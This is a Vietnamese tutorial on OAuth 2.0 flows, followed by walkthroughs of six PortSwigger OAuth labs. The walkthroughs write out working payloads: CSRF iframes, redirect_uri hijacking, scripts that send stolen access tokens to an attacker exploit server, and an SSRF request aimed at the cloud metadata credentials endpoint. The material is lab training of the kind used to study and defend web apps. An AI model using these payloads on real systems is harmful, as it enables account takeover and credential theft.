---
title: 'Web12: OAuth 2.0 authentication vulnerabilities'
tags: [web12]

---

I. OAuth 2.0 Framework
----------------------

### 1\. Khái niệm OAuth 2.0 framework

**OAuth 2.0** là một cơ chế cho phép các dịch vụ bên thứ 3 có quyền truy cập tới một số tài nguyên nhất định của chủ sở hữu tài nguyên. Ban đầu OAuth 2.0 được thiết kế nhằm mục địch xác thực quyền truy cập tới một số tài nguyên nhất định của người dùng. Tuy nhiên, với sự tiện lợi của mình, các trang web dần nhận ra có thể sử dụng framework này đối với việc định danh người dùng dịch vụ thông qua các thông tin được xác thực bởi bên cung cấp dịch vụ OAuth.

### 2\. OAuth Roles

Theo định nghĩa của IETF, trong OAuth có tất cả 4 roles:

-   **Resource owner**: là người dùng sở hữu tài nguyên, thường được hiểu là end-user.
-   **Resource server**: là nơi mà các tài nguyên lưu trữ. Được truy cập và phản hồi lại thông qua các cơ chế xác thực như access token.
-   **Client application**: Là dịch vụ gửi yêu cầu truy cập tới tài nguyên đại diện cho resource owner và các xác thực của nó.
-   ****OAuth service provider****: Dịch vụ cung cấp access token cho client sau khi đã xác minh thành công người dùng và đạt được xác thực quyền truy cập vào tài nguyên.

Trên thực tế, authorization có thể nằm trên cùng một server với resource server hoặc không. Một authorization server có thể cung cấp access token cho nhiều resource server.

### 3\. OAuth Grant Types

OAuth grant type mô tả trình tự chính xác các bước trong quá trình OAuth. Client cũng sử dụng trình tự này mà quyết định quá trình giao tiếp với authorization server nên OAuth grant type còn được gọi là OAuth Flows.

 Có thể tới vài dạng phổ biến nhất như:

-   Authorization Code grant type
-   Client Credentials grant type
-   Device Code grant type
-   Refresh Token grant type
-   Implicit grant type

#### a. Authorization code grant type

Trong kiểu grant type này, client sẽ trao đổi authorization code để lấy được access token. Quá trình này có thể được mô tả trong mô hình dưới đây:

![](https://images.viblo.asia/9a1c269d-6b47-48fd-8bcf-e099a5488fb4.jpg)

Giải thích từng bước của quá trình:

##### 1\. Client gửi một request tới server authentication:

```http
GET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1
Host: oauth-authorization-server.com

```

 

Trong đó bao gồm các tham số khá đặc trưng như:

-   _clientid_: 1 đoạn mã định danh duy nhất của client, được tạo khi client đăng kí với dịch vụ authorization
-   _redirecturi_: là uri mà browser sử dụng để redirect tới sau khi nhận được authorization code. Thường gọi là _callback URI_
-   _responsetype_: là kiểu trả về mà client muốn. Ở đây là _code_.
-   _scope_: các nhóm dữ liệu, tài nguyên mà client muốn truy cập tới. Tùy theo từng dịch vụ OAuth mà có thể khác nhau.
-   _state_ (optional): Là một giá trị duy nhất và không đoán được. Sẽ được gửi lại trong các response và request khác như callback request giống như 1 csrf token.

Ví dụ đăng nhập với facebook (facebook sử dụng là openid, tuy nhiên cơ chế không quá khác biệt) request sẽ dạng như thế này:

![](https://images.viblo.asia/50ada46b-c82f-4ed2-b3dd-6b54ff6606d2.png)

##### 2\. Người dùng đăng nhập và cho phép quyền truy cập

Sau khi nhận được request khởi tạo trên, browser sẽ redirect người dùng tới 1 trang đăng nhập vào hệ thống cung cấp OAuth:

![](https://images.viblo.asia/9c1d6670-7094-4b7c-8daf-ffdcc312dd33.png)

Sau khi xác minh người dùng thành công, authorization server sẽ hỏi người dùng về có cung cấp các quyền cụ thể cho ứng dụng client hay không:

![](https://images.viblo.asia/b62d7db7-18f5-45c1-9c0e-da642b03cc9f.png)

Nếu người dùng đồng ý thì quá trình sẽ tiếp tục sang bước tiếp theo

##### 3\. Authorization server gửi authorization code tới cho client

Sau khi có được sự đồng ý của người dùng cho phép truy cập các tài nguyên, authorization server sẽ gửi lại client 1 đoạn authorization code

![](https://images.viblo.asia/6f131a9e-f8a0-4487-9380-b76955c9530c.png)

##### 4\. Request access token

Khi đã có được authorization code, client sẽ thực hiện request lấy access token từ authorization server. Request này sẽ được tạo trong một kênh riêng không đi qua browser. Client_secret cũng sẽ được truyền qua kênh này.

##### 5\. Client nhận access token

Khi authorization server nhận được request của client, nó sẽ phản hồi lại 1 access token tương ứng với authorization code được gửi lên

##### 6\. Thực hiện API call

Sau khi đã có được access token, giờ client có thể request tới tài nguyên cần thiết để lấy được tài nguyên.

##### 7\. Nhận dữ liệu cần thiết

Lúc này resource server dựa vào access token của client mà trả về các dữ liệu tương ứng.

#### Ưu điểm

Dựa theo mô hình của authorization code grant type, tất cả các dữ liệu quan trọng (ví dụ như access token) đều không đi qua browser mà thông qua một kênh riêng giữa client và authorization server. Điều này giúp tăng tính bảo mật trong quá trình xác thực OAuth. Ngoài ra, client secret cũng sử dụng kênh này để truyền và gửi nên có thể đảm bảo tính an toàn của secret này.

#### Nhược điểm

Nhược điểm duy nhất ở đây là việc triển khai có chút phức tạp hơn so với 1 số kiểu khác.

#### b. Implicit grant type

Implicit grant type đơn giản hơn khá nhiều so với authorization code grant type. Lí do là nó bỏ qua việc request authorization code mà trực tiếp request lấy access token từ phía authorization server. Mô hình của implicit grant type có thể hiểu đơn giản như sau:

![](https://images.viblo.asia/1f2077ae-8d62-4328-b0b8-3c24e9240a9a.jpg)

##### Ưu điểm

Đơn giản, dễ triển khai

##### Nhược điểm

Tất cả các request được gửi qua browser thay vì 1 kênh riêng giữa client và authorization server. Điều này dẫn tới việc các dữ liệu của người dùng và access token có thể bị tấn công, đánh cắp. Ngoài ra việc bảo vệ client secret cũng không hề dễ dàng.

II. Các bài lab
----------------------
# **1. Lab: Authentication bypass via [OAuth](https://portswigger.net/web-security/oauth) implicit flow**
>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the client application makes it possible for an attacker to log in to other users' accounts without knowing their password.
To solve the lab, log in to Carlos's account. His email address is `carlos@carlos-montoya.net`.
You can log in with your own social media account using the following credentials: `wiener:peter`.
![image](https://hackmd.io/_uploads/ByCky9qLC.png)

>Đây là 1 bài dạng OAuth implicit

>Truy cập bài lab, khi ấn `My account` thì trang web sẽ chuyển hướng ta tới 1 trang login bằng tài khoản mạng xã hội:
![image](https://hackmd.io/_uploads/H1uK0Fq80.png)
![image](https://hackmd.io/_uploads/SkrYW59UR.png)


```
Client app send:
1. GET /social-login
2. GET /auth?client_id=q59kysij1x6jfrig26krr&redirect_uri=https://0af3004104269967847a041800320021.web-security-academy.net/oauth-callback&response_type=token&nonce=1161596830&scope=openid%20profile%20email
```
>![image](https://hackmd.io/_uploads/SkCleqcIA.png)

>Ta sẽ đăng nhập với tài khoản được đề bài cho `wiener:peter`
>Đăng nhập thành công, web sẽ hỏi ý kiến người dùng về việc cấp quyền đọc thông tin Profile và Email cho web: ![image](https://hackmd.io/_uploads/rkG1b59UR.png)

>Tại đây, sau khi người dùng xác nhận cấp quyền, OAuth server sẽ redirect về đường dẫn đã định nghĩa ở tham số `redirect_uri` ở trên (`/oauth-callback`) kèm theo `access_token` ở fragment.

```
OAuth server:
<--  GET /oauth-callback#access_token=H_yHSC9Ix4H8l0JRaftZde70pKEAQk0W7UXBzmmkTP4&amp;expires_in=3600&amp;token_type=Bearer&amp;scope=openid%20profile%20email">
```
![image](https://hackmd.io/_uploads/B1kY49qLR.png)

> Khi đó app sẽ truy cập đường dẫn trên: 

```
Client App: 
--> GET /oauth-callback
```
![image](https://hackmd.io/_uploads/rkcTN5qLC.png)
> Ở đây ta có 1 đoạn script thực hiện các công việc sau sau:

- `GET /me` với `access_token` từ fragment để lấy thông tin user.
- `POST /authenticate` với `email`, `username` và `token` có được từ request trên để login.

```javascript
<script>
const urlSearchParams = new URLSearchParams(window.location.hash.substr(1));
const token = urlSearchParams.get('access_token');
fetch('https://oauth-0a0e00d2047799e384360243025b0069.oauth-server.net/me', {
    method: 'GET',
    headers: {
        'Authorization': 'Bearer ' + token,
        'Content-Type': 'application/json'
    }
})
.then(r => r.json())
.then(j => 
    fetch('/authenticate', {
        method: 'POST',
        headers: {
            'Accept': 'application/json',
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            email: j.email,
            username: j.sub,
            token: token
        })
    }).then(r => document.location = '/'))
</script>
```

>Cụ thể, `GET /me` trả về `username`, `email`. Có vẻ như `email` sẽ được dùng để xác thực user:  ![image](https://hackmd.io/_uploads/B1M4Iq9LA.png)

>Thực hiện authen bằng `POST /authenticate`: 
>![image](https://hackmd.io/_uploads/Hk5uIccI0.png)

>Sau khi nắm được flow hoạt động, ở `POST /authenticate` ta có thể thay `email` thành giá trị của email victim:
> ![image](https://hackmd.io/_uploads/Bk7iP9c8A.png)

>Kết quả bypass authen thành công do server không kiểm tra `access_token` có khớp với data gửi lên hay không: 
>![image](https://hackmd.io/_uploads/HkvZu59LR.png)
>
> Hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/SJUk_5qIR.png)

# **2. Lab: Forced [OAuth](https://portswigger.net/web-security/oauth) profile linking**
>This lab gives you the option to attach a social media profile to your account so that you can log in via OAuth instead of using the normal username and password. Due to the insecure implementation of the OAuth flow by the client application, an attacker can manipulate this functionality to obtain access to other users' accounts.
To solve the lab, use a [CSRF attack](https://portswigger.net/web-security/csrf) to attach your own social media profile to the admin user's account on the blog website, then access the admin panel and delete `carlos`.
The admin user will open anything you send from the exploit server and they always have an active session on the blog website.

You can log in to your own accounts using the following credentials:
-   Blog website account: `wiener:peter`
-   Social media profile: `peter.wiener:hotdog`

>Đăng nhập bằng tài khoản và mật khẩu thông thường `wiener:peter`, tại `/my-account`, tồn tại chức năng có thể **"Attach a social profile"**: 
>![image](https://hackmd.io/_uploads/Sy6MrjcLC.png)

>Chọn chức năng này, web sẽ chuyển hướng ta tới 1 trang login của 1 social media: ![image](https://hackmd.io/_uploads/HyaDSocI0.png)

>Sign-in thành công: 
>![image](https://hackmd.io/_uploads/ryiqBi9LC.png)

>Từ đây, mình có thể đăng nhập vào tài khoản `wiener` bằng tài khoản `Social media` mà không cần mật khẩu thông thường nữa:
>![image](https://hackmd.io/_uploads/BkbAHs5IC.png)
![image](https://hackmd.io/_uploads/SkaZ8j58R.png)

>Sau khi đã nắm được flow hoạt động cơ bản của web, ta sẽ đi phân tích chi tiết từng request!
>Để ý thì ở request **"Attach a social profile"**, không đi kèm theo tham số `state`, điều này dẫn tới server không thể xác thực được ai là người gửi, attacker có thể sử dụng CSRF ở chỗ này!
>![image](https://hackmd.io/_uploads/H13Jqi98A.png)

>`redirect_uri` sẽ gửi authorization code tới `/oauth-linking`: 
>![image](https://hackmd.io/_uploads/H1Fd5o5LA.png)

>Khi OAuth server trả về code thì ta có thể sử dụng code đó để khiến nạn nhân attach profile của họ vào account social media của mình. Với điều kiện là code đó chưa được sử dụng.

>Bật Intercept lên, tái tạo lại thao tác attach account social media, Forward cho tới khi lấy được code mới từ server trả về: 
>![image](https://hackmd.io/_uploads/rJN5sjcUR.png)

>Chuột phải chọn Copy URL và DROP request này để đảm bảo rằng code chưa được sử dụng và vẫn giữ được giá trị sử dụng của nó.

>Tắt intercept và log out. Lúc này, ta sẽ vào exploi server, tạo 1 iframe có thuộc tính `src` sẽ trỏ vào URL vừa copy, để khi trình duyệt load iframe, sẽ thực hiện việc attach account họ vào account social media của ta. Payload: 
>`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/oauth-linking?code=STOLEN-CODE"></iframe>
`
![image](https://hackmd.io/_uploads/B1y22j58R.png)

>**"Deliver exploit to victim"**, đăng nhập lại vào bằng account social media, ta thấy rằng đã vào thành công tài khoản của `administrator` do đã lừa được admin và gắn account của mình vào admin: 
>![image](https://hackmd.io/_uploads/SkCPTiqI0.png)

>Thực hiện xóa tài khoản `carlos`:
>![image](https://hackmd.io/_uploads/BJtYaj5LR.png)

>Hoàn thành bài lab: ![image](https://hackmd.io/_uploads/ryvcpjcU0.png)

# **3. OAuth account hijacking via redirect_uri**
>This lab uses an OAuth service to allow users to log in with their social media account. A misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users' accounts.
To solve the lab, steal an authorization code associated with the admin user, then use it to access their account and delete the user `carlos`.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in with your own social media account using the following credentials: `wiener:peter`.
![image](https://hackmd.io/_uploads/ByUalh9LR.png)

>Đăng nhập bằng social media account `wiener:peter` : ![image](https://hackmd.io/_uploads/HJroG3cLC.png)

>Bật Intercept lên, ta có thể chỉnh tham số `redirect_uri` tùy ý tại authorization request: 
>![image](https://hackmd.io/_uploads/r1piXn58C.png)

>Sau đó, authorization code được gửi về đúng `redirect_uri` mà ta vừa chỉnh sửa:
![image](https://hackmd.io/_uploads/H1iRm2cUC.png)

>Ta sẽ thực hiện exploit bằng việc gửi cho admin  authorization request chứa `redirect_uri` là trỏ tới địa chỉ exploit-server mà ta controll. Payload: 
`<iframe src="https://oauth-YOUR-LAB-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
`

>Lưu payload vào exploit server:
>![image](https://hackmd.io/_uploads/S19SShqUC.png)

>**"Deliver exploit to victim"** và xem lại Log thì lấy được authorization code của admin: ![image](https://hackmd.io/_uploads/Syx9S2cL0.png)

>Truy cập tài khoản admin bằng cách truy cập `/oauth-callback?code=<CODE>` với code lấy được: 
>![image](https://hackmd.io/_uploads/r1u6B25LR.png)

>Xóa tài khoản `carlos`: 
>![image](https://hackmd.io/_uploads/H1nAr25IA.png)

>Hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/BJCJ8258C.png)

# **4. Lab: Stealing OAuth access tokens via an open redirect**
>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
To solve the lab, identify an open redirect on the blog website and use this to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
Note:
You cannot access the admin's API key by simply logging in to their account on the client application.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in via your own social media account using the following credentials: `wiener:peter`.
![image](https://hackmd.io/_uploads/Hyti5Un8A.png)

>Tiếp tục là 1 bài đăng nhập bằng tài khoản mạng xã hội cho sẵn, khi truy cập `/my-account` thì API Key đã bị ẩn: 
>![image](https://hackmd.io/_uploads/SybtxDh8C.png)

>Tại Authorization request, thử thay thế `redirect_uri` thành 1 URI khác thì bị báo **"HTTP/2 400 Bad Request"** do không khớp với URI trong whitelist:
>![image](https://hackmd.io/_uploads/B1hpxPhLC.png)

>Tương tự khi xóa đường dẫn `/oauth-callback` trong URI ban đầu đi: 
>![image](https://hackmd.io/_uploads/S1RbbvnLA.png)

>Như vậy, `redirect_uri` phải chứa `https://<LAB-ID>.web-security-academy.net/oauth-callback` đúng trong white list thì mới được server accept!

>Thử path traversal thì lại thấy thành công. Như vậy mình có thể lợi dụng lỗi này để redirect web về  1 URL mà tại đó có chức năng open redirect để trỏ về domain ta controll:
>![image](https://hackmd.io/_uploads/r1YMGvn8R.png)

>Ta sẽ đi tìm 1 nơi mà có thể open redirect. Tại mỗi bài post có chức năng chuyển hướng đến bài tiếp theo: 
>![image](https://hackmd.io/_uploads/SJdU7vh8R.png)

>Với tham số `path` là link mà nó chuyển hướng đến: 
>![image](https://hackmd.io/_uploads/B1U3XvhIA.png)

>Như vậy, ta có thể chỉnh `redirect_uri` thành như sau với path là exploit-server: 
>![image](https://hackmd.io/_uploads/BkmNNDhIC.png)

>Sau đó, Oauth server sẽ truy cập đến exploit-server nhằm để trả về `access_token`
>Bây giờ chỉ việc tạo payload. Đoạn script có chức năng khiến nạn nhân load authorization request =>`access_token` được trả về exploit-server qua query string (vì URL fragment không xem được trong log). Payload:
```
script>
    if (!document.location.hash) {
        window.location = 'https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT-ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/next?path=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit/&response_type=token&nonce=399721827&scope=openid%20profile%20email'
    } else {
        window.location = '/?'+document.location.hash.substr(1)
    }
</script>
```
![image](https://hackmd.io/_uploads/Hy0mHPh80.png)

>**"Deliver exploit to victim"** và xem lại log, ta lấy được `access_token` của admin: ![image](https://hackmd.io/_uploads/S1_6dv3LA.png)

>Có được `access_token`, ta sẽ tiếp tục gửi request tới `/me` để lấy data của người dùng:
>![image](https://hackmd.io/_uploads/HJGDKw3U0.png)

>Thành công lấy được API Key của admin, submit và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/HyeKKw3IC.png)

# **5. SSRF via OpenID dynamic client registration**
>This lab allows client applications to dynamically register themselves with the OAuth service via a dedicated registration endpoint. Some client-specific data is used in an unsafe way by the OAuth service, which exposes a potential vector for SSRF.
To solve the lab, craft an SSRF attack to access `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/` and steal the secret access key for the OAuth provider's cloud environment.
You can log in to your own account using the following credentials: `wiener:peter`
>![image](https://hackmd.io/_uploads/SJRpIBAL0.png)

>Tiếp tục là 1 bài đăng nhập với tài khoản mạng xã hội, đăng nhập tuần tự theo các bước. Bài lab này để lộ đường dẫn tại `/.well_known/openid-configuration` khiến mọi người đều có thể xem được cấu hình của open-id: 
>![image](https://hackmd.io/_uploads/BkT1cHA8R.png)

>Tồn tại 1 endpoint `registration_endpoint` dùng để đăng kí:
>![image](https://hackmd.io/_uploads/rkUMqrA80.png)

>Ta sẽ tạo lại 1 request tới endpoint này với payload ví dụ: 
```
POST /reg HTTP/1.1
Host: oauth-YOUR-OAUTH-SERVER.oauth-server.net
Content-Type: application/json

{
    "redirect_uris" : [
        "https://example.com"
    ]
}
```

>Send với 1 URI `redirect_uris` bất kì, ta thấy server trả về **200 OK** thành công và có client_id:
>![image](https://hackmd.io/_uploads/r1ePbI0UC.png)

>Ngoài ra, ở bước ta xác nhận cho phép web truy cập vào thông tin email và profile ở account social media, ta thấy 1 request `GET /client/ID-CLIENT/logo` dùng để lấy logo ở account mxh:
>![image](https://hackmd.io/_uploads/Hya2-UCLR.png)

>Nó slấy logo từ đường dẫn được định nghĩa tại `logo_uri` tương ứng với `client_id`. Tạo 1 request để kiểm tra:
```
POST /reg HTTP/2
Host: oauth-0a320083040fa04e86ed0af202a900c5.oauth-server.net
Content-Type: application/json
Content-Length: 132

{
    "redirect_uris" : [
        "https://test.vn"
    ],
"logo_uri" : "http://0bcsbcwo4sljp88u21un26ha319sxil7.oastify.com"
}
```
>![image](https://hackmd.io/_uploads/HJ997UCLC.png)

>Vậy là ta có thể controll logo URI này để nó GET vào lấy thông tin về URL bất kì ta controll. Ta sẽ sử dụng Collaborator và kiểm tra xem nó có request tới thật không: 
![image](https://hackmd.io/_uploads/HJ_dmUC80.png)

>Sử dụng `client_id` tương ứng và load logo, kiểm tra thì thấy web đã có request tới collab => chứng tỏ ta có thể SSRF chỗ này để server tự trỏ về chính nó và lấy ra được thông tin ta cần:
>![image](https://hackmd.io/_uploads/BJt-4LA80.png)

>Làm lại các bước tương tự với `logo_uri` chính là đường dẫn đề bài yêu cầu: `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/`:
>![image](https://hackmd.io/_uploads/HyjoE8CL0.png)

>Truy cập logo với `client_id` tương ứng, ta lấy được secret access key của OAuth server:
>![image](https://hackmd.io/_uploads/ryjWrIRIR.png)

>Submit key và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/HJ_rBURI0.png)

# **6. Lab: Stealing OAuth access tokens via a proxy page**
>This lab uses an OAuth service to allow users to log in with their social media account. Flawed validation by the OAuth service makes it possible for an attacker to leak access tokens to arbitrary pages on the client application.
To solve the lab, identify a secondary vulnerability in the client application and use this as a proxy to steal an access token for the admin user's account. Use the access token to obtain the admin's API key and submit the solution using the button provided in the lab banner.
The admin user will open anything you send from the exploit server and they always have an active session with the OAuth service.
You can log in via your own social media account using the following credentials: `wiener:peter`.
![image](https://hackmd.io/_uploads/SJkyReJvC.png)

>Đăng nhập với tài khoản mạng xã hội cho sẵn, như lab trước, ta phát hiện có thể sử dụng lỗ hổng để path traversel cho tham số `redirect_uri`:
>![image](https://hackmd.io/_uploads/SJN7AxywA.png)

>Tiếp theo, dưới mỗi bài post có chức năng comment: 
>![image](https://hackmd.io/_uploads/Hy2vClyvA.png)

>Xem source thì form để comment được load từ đường dẫn `/post/comment/comment-form`
>![image](https://hackmd.io/_uploads/HkI20x1vA.png)

>Xem request tại `/post/comment/comment-form`:
>![image](https://hackmd.io/_uploads/SJG_yWJPA.png)

>Tại đó, xuất hiện một `postMessage()` đến parent có origin bất kì `*`, tức là trang đang dùng frame của comment form này(mỗi bài post), với data gửi đi là `window.location.href`. Như vậy nếu trang exploit-server frame chứa comment-form này thì nó sẽ nhận được data chứa `window.location.href`. Và nếu `redirect_uri` của Oauth là `/post/comment/comment-form` thì `window.location.href` sẽ chứa `access_token` ta cần tìm!

>Theo đó sẽ có iframe chứa authorization request với `redirect_uri` được sửa thành `/oauth-callback/../post/comment/comment-form`. Và khi nhận được message từ `/post/comment/comment-form`, thực hiện fetch đến exploit-server để có thể xem `access_token` qua log.

>Xây dựng iframe:
```
<iframe src="https://oauth-YOUR-OAUTH-SERVER-ID.oauth-server.net/auth?client_id=YOUR-LAB-CLIENT_ID&redirect_uri=https://YOUR-LAB-ID.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>

```

>Xây dựng code JS để fetch data: 
```
<script>
    window.addEventListener('message', function(e) {
        fetch("/" + encodeURIComponent(e.data.data))
    }, false)
</script>
```
![image](https://hackmd.io/_uploads/ryXMb-kwR.png)

>"Deliver exploit to victim" và xem lại log, ta sẽ lấy được `acccess_token`:
>![image](https://hackmd.io/_uploads/B1KAj-yD0.png)

>URL-decode chuỗi nhận được: 
>![image](https://hackmd.io/_uploads/r1Gxh-yw0.png)

>Có được `access_token`, ta sẽ thay vào trong header `Authorization` và gửi đến `GET /me` để lấy user data: 
>![image](https://hackmd.io/_uploads/H15D2-JDC.png)

>Lấy được API key của admin, submit và hoàn thành bài lab: 
>![image](https://hackmd.io/_uploads/Byqt2-JP0.png)

